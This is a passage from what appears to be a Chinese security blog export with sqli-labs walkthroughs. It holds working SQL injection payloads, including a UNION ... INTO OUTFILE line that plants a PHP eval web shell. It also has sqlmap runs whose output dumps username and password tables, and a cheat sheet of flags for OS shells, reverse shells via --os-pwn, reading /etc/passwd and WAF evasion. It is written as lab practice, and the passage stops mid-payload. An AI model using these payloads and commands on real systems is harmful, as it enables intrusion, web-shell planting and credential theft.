sqli-labs/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&apos;,4,5 into outfile &quot;C:/phpStudy/WWW/sqli-labs/Less-7/shell.php&quot; %23 写入成功后，能够直接访问，使用中国菜刀直接连接即可 参考：【科普文】双查询注入 Double SQL Injection(双查询注入)]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap使用指南]]></title>
    <url>%2F2018%2F04%2F19%2Fsqlmap%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[使用sqli-labs练习社区sqlmap（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 工具注入(sqlmap)简单演示简单测试 (-u url)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --level 3 [*] starting at 15:33:02 [15:33:02] [INFO] resuming back-end DBMS &apos;mysql&apos; [15:33:02] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=1&apos; AND 1906=1906-- PKiX Type: error-based Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id=1&apos; AND (SELECT 6992 FROM(SELECT COUNT(*),CONCAT(0x7162786271,(SELECT (ELT(6992=6992,1))),0x7162766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- yOBo Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1&apos; AND SLEEP(5)-- PmIF Type: UNION query Title: Generic UNION query (NULL) - 5 columns Payload: id=-3918&apos; UNION ALL SELECT NULL,CONCAT(0x7162786271,0x58716e444643434d644b55716c6477776464456e4673725a4b65444771624356436a56647a76586b,0x7162766a71),NULL,NULL,NULL-- eMQX --- [15:33:03] [INFO] the back-end DBMS is MySQL web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 注：-v(–level) 3 同时显示注入的payload 列出数据库系统的数据库(–dbs)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dbs web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [14:51:37] [INFO] fetching database names [14:51:38] [INFO] the SQL query used returns 6 entries [14:51:39] [INFO] retrieved: information_schema [14:51:41] [INFO] retrieved: challenges [14:51:42] [INFO] retrieved: mysql [14:51:43] [INFO] retrieved: performance_schema [14:51:44] [INFO] retrieved: security [14:51:45] [INFO] retrieved: test available databases [6]: [*] challenges [*] information_schema [*] mysql [*] performance_schema [*] security [*] test 列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --tables -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:03:02] [INFO] fetching tables for database: &apos;security&apos; [15:03:03] [INFO] the SQL query used returns 4 entries [15:03:04] [INFO] retrieved: emails [15:03:05] [INFO] retrieved: referers [15:03:06] [INFO] retrieved: uagents [15:03:07] [INFO] retrieved: users Database: security [4 tables] +----------+ | emails | | referers | | uagents | | users | +----------+ 列出数据库中的列(–column -T 表名 -D 数据库名 若无-D参数则默认当前数据库)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --column -T &apos;users&apos; -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:08:34] [INFO] fetching columns for table &apos;users&apos; in database &apos;security&apos; [15:08:36] [INFO] the SQL query used returns 5 entries [15:08:37] [INFO] retrieved: &quot;id&quot;,&quot;int(3)&quot; [15:08:38] [INFO] retrieved: &quot;username&quot;,&quot;varchar(20)&quot; [15:08:39] [INFO] retrieved: &quot;password&quot;,&quot;varchar(20)&quot; [15:08:40] [INFO] retrieved: &quot;first_name&quot;,&quot;varchar(8)&quot; [15:08:41] [INFO] retrieved: &quot;last_name&quot;,&quot;varchar(8)&quot; Database: security Table: users [5 columns] +------------+-------------+ | Column | Type | +------------+-------------+ | first_name | varchar(8) | | id | int(3) | | last_name | varchar(8) | | password | varchar(20) | | username | varchar(20) | +------------+-------------+ 获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dump -C &apos;username&apos;,&apos;password&apos; -T &apos;users&apos; -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:19:18] [INFO] fetching entries of column(s) &apos;password, username&apos; for table &apos;users&apos; in database &apos;security&apos; [15:19:18] [INFO] the SQL query used returns 13 entries [15:19:19] [INFO] retrieved: &quot;Dumb&quot;,&quot;Dumb&quot; [15:19:20] [INFO] retrieved: &quot;I-kill-you&quot;,&quot;Angelina&quot; [15:19:21] [INFO] retrieved: &quot;p@ssword&quot;,&quot;Dummy&quot; [15:19:22] [INFO] retrieved: &quot;crappy&quot;,&quot;secure&quot; [15:19:23] [INFO] retrieved: &quot;stupidity&quot;,&quot;stupid&quot; [15:19:24] [INFO] retrieved: &quot;genious&quot;,&quot;superman&quot; [15:19:25] [INFO] retrieved: &quot;mob!le&quot;,&quot;batman&quot; [15:19:26] [INFO] retrieved: &quot;admin&quot;,&quot;admin&quot; [15:19:27] [INFO] retrieved: &quot;admin1&quot;,&quot;admin1&quot; [15:19:29] [INFO] retrieved: &quot;admin2&quot;,&quot;admin2&quot; [15:19:30] [INFO] retrieved: &quot;admin3&quot;,&quot;admin3&quot; [15:19:31] [INFO] retrieved: &quot;dumbo&quot;,&quot;dhakkan&quot; [15:19:32] [INFO] retrieved: &quot;admin4&quot;,&quot;admin4&quot; [15:19:32] [INFO] analyzing table dump for possible password hashes Database: security Table: users [13 entries] +----------+------------+ | username | password | +----------+------------+ | Dumb | Dumb | | Angelina | I-kill-you | | Dummy | p@ssword | | secure | crappy | | stupid | stupidity | | superman | genious | | batman | mob!le | | admin | admin | | admin1 | admin1 | | admin2 | admin2 | | admin3 | admin3 | | dhakkan | dumbo | | admin4 | admin4 | +----------+------------+ sqlmap使用语法大全1. 基础用法：./sqlmap.py -u “注入地址” -v 1 –dbs // 列举数据库 ./sqlmap.py -u “注入地址” -v 1 –current-db // 当前数据库 ./sqlmap.py -u “注入地址” -v 1 –users // 列数据库用户 ./sqlmap.py -u “注入地址” -v 1 –current-user // 当前用户 ./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库” // 列举数据库的表名 ./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库” // 获取表的列名 ./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库” // 获取表中的数据，包含列 已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中、、、 2. sqlmap post注入我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 1. 浏览器打开目标地址http:// www.2cto.com /Login.asp 2. 配置burp代理(127.0.0.1:8080)以拦截请求 3. 点击login表单的submit按钮 4. 如下图，这时候Burp会拦截到了我们的登录POST请求 5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 6. 运行sqlmap并使用如下命令： ./sqlmap.py -r search-test.txt -p tfUPass 这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 3.sqlmap cookies注入sqlmap.py -u “http://127.0.0.1/base.php” –cookies “id=1″ –dbs –level 2 默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我 们直接在原有的基础上面加上 –level 2 即可利用sqlmap cookies注入突破用户登录继续注入先把用户登陆的cookie拿到吧，在收藏夹添加一个链接cookies属性：名字自己取javascript:alert(document.cookie)，，需要获取当前cookie的时候，直接点一下这个链接，然后复制一下弹出对话框里的cookie值就搞定了 sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid –dbms mssql –cookie=”info=username=test” -p是指指定参数注入 4. sqlmap遇到url重写的注入哪里存在注入就加上 * 号 ./sqlmap.py -u “http://www.cunlide.com/id1/1*/id2/2“ ###5.sqlmap 编码绕waf注入 ./sqlmap.py -u http://127.0.0.1/test.php?id=1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py”在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载 其他基础：sqlmap -u “http://url/news?id=1” –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称 sqlmap -u “http://www.xxoo.com/news?id=1” –level=3 –smart –dbms “Mysql” –current-db #获取当前数据库名称 sqlmap -u “http://www.xxoo.com/news?id=1” –level=3 –smart –dbms “Mysql”–tables -D “db_name” #列表名 sqlmap -u “http://url/news?id=1” –level=3 –smart –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段 sqlmap -u “http://url/news?id=1” –level=3 –smart –dbms “Mysql” –dump -C “column_name” -T “table_name” -D “db_name” -v 0 #获取字段内容 **信息获取**sqlmap -u “ –smart –dbms “Mysql” –users #列数据库用户 sqlmap -u “ –smart –dbms “Mysql” –dbs#列数据库 sqlmap -u “ –smart –dbms “Mysql”–passwords #数据库用户密码 sqlmap -u “ –smart –dbms “Mysql”–passwords-U root -v 0 #列出指定用户数据库密码 sqlmap -u “ –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表 sqlmap -u “ –smart –dbms “Mysql”–privileges #查看权限 sqlmap -u “ –smart –dbms “Mysql”–privileges -U root #查看指定用户权限 sqlmap -u “ –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员 sqlmap -u “ –smart –dbms “Mysql” –roles #枚举数据库用户角色 sqlmap -u “ –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！） sqlmap -u “ –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表 sqlmap -u “ –smart –dbms “Mysql” –union-check #是否支持union 注入 sqlmap -u “ –smart –dbms “Mysql”–union-cols #union 查询表记录 sqlmap -u “ –smart –dbms “Mysql” –union-test #union 语句测试 sqlmap -u “ –smart –dbms “Mysql” –union-use –banner #采用union 注入 sqlmap -u “ –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by sqlmap -u “ –smart –dbms “Mysql”–method “POST” — data “id=1&amp;cat=2″ #post注入 sqlmap -u “ –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入 sqlmap -u “ –smart –dbms “Mysql”-b #获取banner信息 sqlmap -u “http://url/news?id=1” –level=3 –smart-v 1 -f #指纹判别数据库类型 sqlmap -u “http://url/news?id=1” –level=3 –smart–proxy”http://127.0.0.1:8118” #代理注入 sqlmap -u “http://url/news?id=1″–string”STRING_ON_TRUE_PAGE“ #指定关键词 sqlmap -u “ –smart –dbms “Mysql”–sql-shell #执行指定sql命令 sqlmap -u “ –smart –dbms “Mysql”–file /etc/passwd sqlmap -u “ –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令 sqlmap -u “ –smart –dbms “Mysql”–os-shell #系统交互shell sqlmap -u “ –smart –dbms “Mysql”–os-pwn #反弹shell sqlmap -u “ –smart –dbms “Mysql”–reg-read #读取win系统注册表 sqlmap -u “ –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度 sqlmap -u “ –smart –dbms “Mysql” –dbs -o “sqlmap.log” –resume #恢复已保存进度 注入分法不同，种类不同，来个简单的分类：1.get型：sqlmap -u “http://xxx.xx.xxx/xx.xxx?xx=xxx” 2.post型: sqlmap -u “http://xxx.xx.xxx/xx.xxx” –data=”xxxx=xxxx&amp;xxxx=xxx” 3.cookie类注入: sqlmap -u “http://xxx.xx.xxx/xx.xxx?xx=xxx” –cookie=”xxx=xxx&amp;xxx=xxx” –level=2 好，区分完毕再来后续的 需要数据库好：–dbs 得到数据库名称xxx，需要表： -D xxx –tables 得到表名xxxx，需要段：-D xxx -T xxxx –columns 得到段内有admin，password，需要值：-D xxx -T xxxx -C “admin,password” –dump 那么我们来理解一下，-D -T -C 是干吗的，当然就是知道其名称，指定使用其。 –dbs –tables –columns 是干吗的，当然就是不知道名称，列出来呗 –dump 那自然就是字面意思，类似于导出数据的行为 其实注入有了上面这几个命令，妥妥的够用了，不过还需要绕waf –tamper=”&quot; 注入被识别出来是工具，断开咋办–user-agent=”&quot; 再多牛逼的功能都是慢慢积累出来的，别想一口吃成胖子 例子：http://www.xxx.com/login.asp有post注入，我想*了,但是我不想出去拷贝post数据，很麻烦，我想让sqlmap自动跑post注入 sqlmap -u “http://www.xxx.com/login.asp” –forms 很好，上面的命令成功的帮我跑了post注入，并且找到了post的注入点jjj=123 sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj –dbs 于是我用上面的命令看看数据库 sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj –is-dba 顺便看看当前用户是不是dba sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -a 用了上面的命令 -a能得到什么呢：自己去看帮助吧。帮你筛选了一下，-a下面的那些命令是用来看用户，看主机，看权限的。 后来呢，我发现权限还是挺高的，同时呢，我跑出来了数据库名称kkk sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -D kkk –tables 同时我找到了网站路径，然后我就又一次找到了sqlmap的牛逼的–os-xx系列命令，可以执行系统命令，同时还发现了牛逼的xpcmdshell –os-shell 以及很多牛逼的文件操作命令–file-xx 这些命令在需要用的时候使用就是了，会给你带来意想不到的惊喜 与此同时，我发现tables里面没有我想要的东西，我也找不到合适的内容，咋办呢，心一横，我决定把所有的数据库内容跑出来自己找，于是我这么做： sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -D kkk –dump-all 然后牛逼的sqlmap就开始跑啊跑，然后紧接着我的蛋就碎了，尼玛，sqlmap一会就问你一次要不要破解密码，要不要这个，要不要那个，我和我的小朋友们都想擦你妹夫，功夫不负有心人，我又看见了一个命令 –batch 可以自动选择sqlmap默认选项于是，我可以和我的小朋友们玩耍去了，再也不用看着sqlmap拖库了。 总结下来，帮助文档还是很重要的，多看看，总会有些收获：为了避免各位看英文看到吐，大概总结下： Target: 字面意思，目标，那么就是确定目标的 Request: 字面意思，请求，就是定义请求内容的，比如post数据，http头，cookie注入，http头污染等等 Optimization：字面意思，调节性能，等等 Injection: 字面意思，注入的设置内容基本在这里，比如指定注入点，指定db，指定系统，等等 Detection: 基本就是用在确认注入范围，寻找注入点区域，这些 Technique: 基本用在确定注入手段，以及攻击方式 Fingerprint: 基本用在指纹识别，用的很少 Enumeration: 枚举信息，主要用在注入中，很重要，很常用 Brute force: 用来爆破，其实主要是枚举tables columns用的 User-defined function injection: 现在只有udf提权，以及指定一些自己定义的sqlmap脚本用，高端使用，求大牛指点 File system access 主要是文件读取，文件写入 Operating system access 主要用在对系统操作，例如os-shell 以及 后续的连接metasploit 实现后渗透攻击 windows registry access 基本就是注册表操作了 General 字面意思，综合的内容，一些特殊的功能实现，我在这里找到了crawl batch这些非常好用的参数 Miscellaneous 目测高端应用，还没怎么用过，求大神指教 如上面总结的，大概红字就是常用的命令，剩下的不常用里面也有很多很不错，在特殊情况下适用的内容，反正本贴科普而已。 字有点多，想看的菜鸟朋友认真看下来应该会有些收获，菜鸟们如果有什么其他的奇技淫巧，还希望分享1、2 共同进步！！ SQLMAP中文说明-D直接直接连接到数据库 -U网址 - URL = URL目标URL -L使用burp,WebScarab代理日志解析目标保存在指定的文本文件 -M BULKFILE扫描多个目标入伍 -R REQUESTFILE负载的HTTP请求从一个文件 -G读取谷歌url，传说中的批量检测 -C从配置INI文件configfile中加载选项 要求： 这些选项可以用来指定如何连接到目标URL。 --data=DATA通过POST发送数据串 --cookie=COOKIE 的HTTP Cookie头 --cookie-urlencode URL编码生成的cookie注射 --drop-set-cookie忽略从Set-Cookie头的响应 --user-agent=AGENT HTTP User-Agent头 --random-agent 随机选择的HTTP User-Agent头 --referer=REFERER HTTP Referer头 --headers=HEADERS HTTP头换行符隔开 --auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM） --auth-cred=ACRED的HTTP身份验证凭据（用户名：密码） --auth-cert=ACERT ACERT HTTP认证证书（key_file，cert_file中） --proxy=PROXY HTTP代理连接到目标URL --proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码） --ignore-proxy忽略HTTP代理 --delay=DELAY每个HTTP请求之间的延迟 --timeout=TIMEOUT 等待连接超时（默认30） --retries=RETRIES 重试连接超时（默认3） --scope=SCOPE 正则表达式来过滤目标提供代理日志 --safe-url=SAFURL URL地址访问测试过程中经常 --safe-freq=SAFREQ访问之间的一个给定的安全URL SAFREQ测试要求 优化： 这些选项可以用于优化性能的SqlMap。 -O开启所有优化开关 --predict-output 预测输出预测常见的查询输出 --keep-alive 保持活动使用持久HTTP（S）连接 --null-connection 空连接检索页面没有实际的HTTP响应体长度 --threads=THREADS最大数量的并发HTTP（S）请求（默认为1） 注射： 这些选项可以用来指定哪些参数测试， 提供定制注塑载荷和可选篡改脚本。 -P TESTPARAMETER可测试参数（S） --dbms=DBMS指定数据库 --os=OS指定操作系统 --prefix=PREFIX注射有效载荷前缀字符串 --suffix=SUFFIX注射有效载荷后缀字符串 --tamper=TAMPER篡改注入数据为使用给定的脚本（S） 检测： 这些选项可以用来指定如何解析和比较页面 从HTTP响应时使用盲SQL注入技术的内容。 --level=LEVEL要执行的测试水平等级（1-5，默认为1） --risk=RISK 测试执行的风险（0-3，默认为1） --string=STRING字符串匹配字符串在查询时是有效的页面 --regexp=REGEXP的正则表达式匹配在页面查询时是有效的 --text-only 纯文本比较只对文字内容为基础的网页 技巧： 这些选项可以用来调整特定的SQL注入测试 技术。 --technique=TECH SQL注入技术测试（默认博伊斯特） --time-sec=TIMESEC秒的拖延DBMS响应（默认为5） --union-cols=UCOLS列范围测试 --union-char=UCHAR字符使用暴力破解的列数 指纹：-f, --fingerprint 指纹进行广泛的DBMS版本指纹 枚举： 这些选项可以用来列举的后端数据库 管理系统中所包含的信息，结构和数据 表。此外，您可以运行您自己的SQL语句。 -b，--banner数据库的旗帜 --current-user数据库当前用户 --current-db检索数据库当前数据库 --is-dba 检测如果DBMS当前用户是DBA --users 枚举用户和DBMS用户 --passwords 密码枚举DBMS用户密码哈希 --privileges 特权列举数据库用户的权限 --roles 角色枚举数据库用户的角色 --dbs枚举的DBMS数据库 --tables DBMS数据库表 --columns DBMS数据库表列 --schema枚举数据库模式 --count检索表条目的数量 --dump转储DBMS数据库表条目 --dump-all全部转储所有的DBMS数据库表中的条目 --search搜索列（S），表（S）和/或数据库名称（S） -D DBMS数据库枚举 -T DBMS数据库表枚举 -C DBMS的数据库表列列举 -U用户DBMS用户枚举 --exclude-sysdbs排除列举表时，DBMS系统数据库 --start=LIMITSTART首先查询的输出项检索 --stop=LIMITSTOP最后查询的输出项检索 --first=FIRSTCHAR首先查询输出单词字符检索 --last=LASTCHAR最后查询的输出单词字符检索 --sql-query=QUERY执行查询的SQL语句 --sql-shell提示下一个交互式SQL外壳 蛮力： 这些选项可以用来运行蛮力检查的。 --common-tables 共同表检查存在共同表 --common-columns 共同列检查存在共同的列 用户定义的函数注入： 这些选项可以被用来创建用户自定义功能。 --udf-inject注入用户自定义功能 --shared-lib=SHLIB本地路径的共享库 文件系统的访问： 这些选项可以被用来访问后端数据库管理 系统底层的文件系统。 --file-read=RFILE DBMS文件系统读取文件 --file-write=WFILE写后端的DBMS文件系统上的本地文件 --file-dest=DFILE后端数据库的绝对文件路径写入 操作系统访问： 这些选项可以被用来访问后端数据库管理 系统底层操作系统。 --os-cmd=OSCMD执行操作系统命令 --os-shell提示符下交互式操作系统外壳 --os-pwn提示为一个彻头彻尾的带外壳，meterpreter或VNC --os-smbrelay一个点击提示一个OOB壳，meterpreter或VNC --os-bof存储过程缓冲区溢出剥削 --priv-esc数据库进程“用户权限升级 --msf-path=MSFPATH本地路径Metasploit Framework等3安装 --tmp-path=TMPPATH远程绝对路径的临时文件目录 Windows注册表的访问： 这些选项可以被用来访问后端数据库管理 系统Windows注册表。 --reg-read读Windows注册表项值 --reg-add写一个Windows注册表项值数据 --reg-delL删除Windows注册表键值 --reg-key=REGKEY Windows注册表 --reg-value=REGVAL Windows注册表键值 --reg-data=REGDATA Windows注册表关键值数据 --reg-type=REGTYPE Windows注册表项值类型 秘书长： 这些选项可以用来设置一些一般性的工作参数。 -s 保存和恢复在会议文件中检索所有数据 -t 登录到一个文本文件中所有的HTTP流量 --batch 一批从不要求用户输入，使用的默认行为 --charset=CHARSET字符编码，用于数据检索 --eta显示预计到达时间为每个输出 --flush-session 冲洗会议会话文件 --fresh-queries在会议文件中存储的查询结果 --save 配置INI文件保存选项 --update更新的SqlMap 杂项：--beep SQL注入发现 --check-payload 检查有效载荷的IDS检测测试 --cleanup清理SqlMap特定的UDF和表的DBMS --forms解析和测试形式的目标URL --gpage=GOOGLEPAGE使用Google从指定的页码dork结果 --mobile通过HTTP User-Agent头 --page-rank显示网页排名（PR）为Google dork结果 --parse-errors解析DBMS响应页面的错误信息 --replicate复制倒入一个SQLite3数据库中的数据 --tor的使用默认的Tor（Vidalia的/ Privoxy的/ Polipo即可）代理地址 --wizard向导为初学者用户简单的向导界面]]></content>
      <tags>
        <tag>sqli-labs</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs_Less_1-4]]></title>
    <url>%2F2018%2F04%2F19%2Fsqli-labs-Less-1-4%2F</url>
    <content type="text"><![CDATA[sqli-labs练习SQL注入（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 手工注入(hackbar)Less-1 Get-Error-Single quotes-String从标题可以知是基于get请求方法的单引号字符报错 页面提示输入数字型参数 id /sqli-labs/Less-1/?id=1 返回正常页面 Welcome Dhakkan Your Login name:Dumb Your Password:Dumb 加一个单引号测试 sqli-labs/Less-1/?id=1&apos; 页面报错 Welcome Dhakkan You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 从外层依次去掉闭合的单引号可以看到只剩下 1’ ,可知为字符型注sql注入（字符型和数字型的区别会在Less-2后区分）。 构造payload在这里使用 # 或– 注释掉多余的部分（当然，这里也可以使用其他方法闭合这个单引号），对#进行了url编码，构造好使其正常返回。 sqli-labs/Less-1/?id=1&apos; %23 返回正常 猜测字段数（order by ）使用联合查询 (union select)首先使用order by 进行字段数猜测 sqli-labs/Less-1/?id=1&apos; order by 10%23 返回错误 ：Unknown column ‘10’ in ‘order clause’ sqli-labs/Less-1/?id=1&apos; order by 5%23 返回正常 sqli-labs/Less-1/?id=1&apos; order by 6%23 返回错误可知字段数为 5 找到显示位sqli-labs/Less-1/?id=-1&apos; union select 1,2,3,4,5%23 这里注意把id的值设置为一个错误的值，这里设置为了-1可知显示位在 2，3 Welcome Dhakkan Your Login name:2 Your Password:3 查看目标数据库基本信息sqli-labs/Less-1/?id=-1&apos; union select 1,version(),user(),4,5%23 返回如下 Welcome Dhakkan Your Login name:5.5.53 Your Password:root@localhost 函数 功能 database() 返回当前数据库名 security user() 返回当前数据库连接使用的数据库 security version() 返回当前数据库的版本 5.5.53 system_user() 查询系统用户名 root@localhost session_user() 连接数据库的用户名 root@localhost current_user() 查询当前用户名 root@localhost @@version_compile_os 查询数据库操作系统 Win32 @@datadir 查询数据库路径 C:\phpStudy\MySQL\data\ @@basedir 查询MySQL路径 C:/phpStudy/MySQL/ 注：MySQL在5.xx版本以上有个information_schema数据库，该数据库记录了当前数据库的所有数据库、表、列、用户权限等信息，其中SCHEMATA 表存储MySQL所有数据库的基本信息，包括数据库名、编码类型路径等，show databases;结果取自此表；TABLE表存储MySQL中的表信息，show tables from schemaname;的结果取自此表；COLUMNS表：提供了表的列信息，show columns from schemaname.tablename;的结果取自此表 可得到该数据库基本信息 版本：5.5.53 用户：root@localhost 当前数据库名： security 获取数据库中的信息（database，table，column）获取数据库sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata %23 返回了数据库 information_schema,一般MySQL中不止一个数据库，可以在加个limit 1,1第一个1表示从那里开始，第二个1表示几个，可以通过不断更改第一个数来显示数据库 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata limit 2,1%23 当然更简单的方法是使用group_concat()一次性返回所有的 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23 返回：information_schema,challenges,mysql,performance_schema,security,testsecurity为需要查找的数据库 获取表sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23 或者 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=0x7365637572697479 %23 返回：emails,referers,uagents,users 注意：security是字符串要使用单引号包裹，或者将其转为十六进制，数值类型不需要单引号（有时可能会过滤掉单引号） 获取列sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23 返回：id,username,password,first_name,last_name 获取数据到这里我们已经知道了数据库名security,表名users,列名id,username,password,first_name,last_name sqli-labs/Less-1/?id=-1&apos; union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23 返回 Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 Less-2 GET-Error based-Intiger based基于get请求方法的整形注入根据页面提示可知为数字型参数 id sqli-labs/Less-2/?id=1 页面返回 Welcome Dhakkan Your Login name:Dumb Your Password:Dumb 添加一个单引号后 sqli-labs/Less-2/?id=1&apos; 页面返回错误 Welcome Dhakkan You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1 从外层逐层去掉闭合单引号发现只剩下一个单引号 ，可以判断为数字型sql注入。 构造payloadLess-2/?id=1 %23 数字型直接把后面的注释掉即可 sqli-labs/Less-2/?id=1 order by 6 %23 报错 sqli-labs/Less-2/?id=1 order by 5 %23 正常 sqli-labs/Less-2/?id=-1 union select 1,2,3,4,5 %23 显示位 2，3 sqli-labs/Less-2/?id=-1 union select 1,version(),database(),4,5 %23 版本：5.5.53 数据库：security sqli-labs/Less-2/?id=-1 union select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23 返回所有的数据库 sqli-labs/Less-2/?id=-1 union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23 返回security数据库的所有表名 sqli-labs/Less-2/?id=-1 union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23 返回users表的所有列名 sqli-labs/Less-2/?id=-1 union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23 返回users表中的username和password字段的值 以上payload与Less-1相似 字符型注入和数字型注入的区别Less-1 字符型 id=’$id’ $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; Less-2 数字型 id=$id $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 加了一个单引号的报错结果 字符型：&apos;&apos;1&apos;&apos; LIMIT 0,1&apos; 从外逐层去掉成对的单引号 1&apos; 数字型：&apos;&apos; LIMIT 0,1&apos; 从外逐层去掉成对的单引号 &apos; 如果没有报错显示：test1不报错,test2报错为字符型 test1 sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=&apos;2 test2 sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=2 对比可知：字符型使用单号包裹，数字型无；加了一个单引号后可以看到提交的参数被单引号包裹；以及上面测试的结果判断。 Less-3 GET-Error-Single quotes with twist-string基于get请求方法的带括号的单引号字符型报错注入测试sqli-labs/Less-3/?id=1&apos; 返回 near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1 分析发现是在 Less-1的基础上加了括号 构造payloadsqli-labs/Less-3/?id=1&apos;) %23 返回正常,这里看一下源码就更好理解了 $sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;; 按照之前的思路测试即可sqli-labs/Less-3/?id=1&apos;) order by 6 %23 返回错误 sqli-labs/Less-3/?id=1&apos;) order by 5 %23 返回正常 sqli-labs/Less-3/?id=-1&apos;) union all select 1,2,3,4,5 %23 可知 2，3回显 Less-4 Get-Error based- Double Quotes-string基于get请求方法的双引号报错注入测试sqli-labs/Less-4/?id=1&apos; 页面正常没有任何异常（这里加了单引号没作用），加一个双引号 sqli-labs/Less-4/?id=1&quot; 返回 near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1 从外逐层去掉成对的双引号和单引号 ，我们发现情况与Less-3类似，只是单引号换成双引号。 构造payloadsqli-labs/Less-4/?id=1&quot;) %23 返回正常 按照之前的思路即可sqli-labs/Less-4/?id=1&quot;) order by 6%23 sqli-labs/Less-4/?id=1&quot;) order by 5%23 sqli-labs/Less-4/?id=-1&quot;) union select 